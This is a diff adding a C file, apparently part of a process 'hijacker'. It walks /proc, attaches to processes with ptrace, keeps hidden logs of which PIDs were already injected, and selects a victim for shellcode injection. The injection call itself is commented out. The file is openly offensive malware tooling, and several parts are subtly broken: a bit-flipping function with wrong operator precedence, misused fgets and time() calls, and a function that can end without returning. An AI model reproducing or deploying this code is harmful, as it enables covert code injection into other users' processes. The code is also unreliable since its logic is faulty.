@@ -1,0 +1,197 @@
+#include <stdio.h>
+#include <dirent.h>
+#include "injector.c"
+#include "shellcode.h"
+#include <fcntl.h>
+
+
+int flip_int(int x) {
+    return x & 0x000000FF << 24 | x & 0x0000FF00 << 8 | x & 0x00FF0000 >> 8 | x & 0xFF000000 >> 24;
+}
+
+int get_uid_proc(int pid) {
+    char path[256];
+    sprintf(path, "/proc/%d/status", pid);
+    FILE *fp = fopen(path, "r");
+    if (fp == NULL) {
+        return -1;
+    }
+
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        if (strstr(line, "Uid:") != NULL) {
+            int uid;
+            sscanf(line, "Uid: %d", &uid);
+            fclose(fp);
+            return uid;
+        }
+    }
+
+    fclose(fp);
+    return -1;
+}
+
+int already_injected(int pid) {
+    FILE *fp = fopen(PROC_LOG, "r");
+    if (fp == NULL) {
+        log_pid_to_file(0xffffffff, 1);
+        log_pid_to_file(0xffffffff, 2);
+        return 0;
+    }
+    int p1 = 0, p2 = 0;
+    unsigned long aux = 0;
+    fgets(&aux, 8, fp);
+    p1 = aux & 0xffffffff00000000 >> 32;
+    p2 = aux & 0x00000000ffffffff;
+    p1 = flip_int(p1);
+    p2 = flip_int(p2);
+    if (p1 == 0xffffffff || p2 == 0xffffffff) {
+        return 0;
+    }
+    // log_info("Already injected processes: %d, %d\n", p1, p2);
+    fclose(fp);
+    if (p1 != pid && p2 != pid) {
+        // log_info("Process %d was not injected(%d, %d)\n", pid, p1, p2);
+        return 0;
+    } else if (pid == p1) {
+        fp = fopen(LOG1, "r");
+        if (fp == NULL) {
+            return 0;
+        }
+        p1 = 0;
+        fclose(fp);
+
+        if (time() - p1 > MARGIN) {
+            // log_info("Process %d was not injected in the last %d seconds\n", pid, MARGIN);
+            return 0;
+        }
+    } else {
+        fp = fopen(LOG2, "r");
+        if (fp == NULL) {
+            return 0;
+        }
+        p2 = 0;
+        fclose(fp);
+
+        if (time() - p2 > MARGIN) {
+            // log_info("Process %d was not injected in the last %d seconds\n", pid, MARGIN);
+            return 0;
+        }
+    }
+    return 1;
+}
+
+void log_pid_to_file(int pid, int idx) {
+    FILE *fp = fopen(PROC_LOG, "r");
+    int p1 = 0, p2 = 0;
+    if (fp != NULL) {
+        unsigned long aux = 0;
+        fgets(&aux, 8, fp);
+        p1 = aux & 0xffffffff00000000 >> 32;
+        p2 = aux & 0x00000000ffffffff;
+        fclose(fp);
+    }
+    fp = fopen(PROC_LOG, "w");
+    if (idx == 1) {
+        fwrite(&pid, 4, 1, fp);
+        fwrite(&p2, 4, 1, fp);
+        fclose(fp);
+    } else {
+        fwrite(&p1, 4, 1, fp);
+        fwrite(&pid, 4, 1, fp);
+        fclose(fp);
+    }
+}
+
+
+int find_pid() {
+    DIR *dir;
+    struct dirent *entry;
+    if (!(dir = opendir("/proc"))) {
+        return -1;
+    }
+    
+    char data[2], proc_name[12];
+    int idx = 1;
+    memset(proc_name, 0, sizeof(proc_name));
+
+    FILE* fd = fopen(IDX_DIR, "r");
+    if (fd == NULL) {
+        fd = fopen(IDX_DIR, "w");
+        fwrite("\x01", 1, 1, fd);
+        idx = 1;
+        fclose(fd);
+    } else {
+        fgets(data, 2, fd);
+
+        FILE *fd_op = fopen(OP_DIR, "r");
+        if (fd_op != NULL) {
+            char op[2];
+            fgets(op, 2, fd_op);
+            fclose(fd_op);
+            data[0] += op[0];
+            data[0] = data[0] % 2;
+        }
+
+
+        fclose(fd);
+        fd = fopen(IDX_DIR, "w");
+        // ftruncate(fd, 0);
+        if (data[0] == '\x00') {
+            idx = 1;
+            fwrite("\x01", 1, 1, fd);
+        } else {
+            idx = 2;
+            fwrite("\x00", 1, 1, fd);
+        }
+        fclose(fd);
+    }
+
+    char cmdline[256];
+    char *path = malloc(0x28);
+    strcpy(path, "/proc/");
+
+    int crt = 1;
+    // log_info("Searching for process with index %d\n", idx);
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            char *name = entry->d_name;
+            if (only_digits(name)) {
+                strcpy(path + 6, name);
+                strcpy(path + 6 + strlen(name), "/cmdline");
+
+                FILE *fp = fopen(path, "r");
+                if (fp != NULL) {
+                    fgets(cmdline, sizeof(cmdline), fp);
+                    fclose(fp);
+                    if (!attach(atoi(name)) && !already_injected(atoi(name))) {
+                        detach(atoi(name));
+
+                        if (crt == idx) {
+                            // log_info("Found process with PID %s and UID %d\n", name, get_uid_proc(atoi(name)));
+                            log_pid_to_file(atoi(name), idx);
+                            return atoi(name);
+                        } else
+                            crt++;
+                    }
+                }
+            }
+
+        }
+    }
+
+    closedir(dir);
+
+}
+
+int main(int argc, char **argv) {
+    // if (DEBUG) {
+    //     FILE *fp = fopen("/tmp/log", "a");
+    
+    //     fwrite("Hijacker\n", 1, 8, fp);
+    //     fclose(fp);
+    // }
+    int pid = find_pid();
+    // log_info("Injecting shellcode into PID %d\n", pid);
+    //return inject((pid_t)pid, shellcode, shellcode_len);
+}
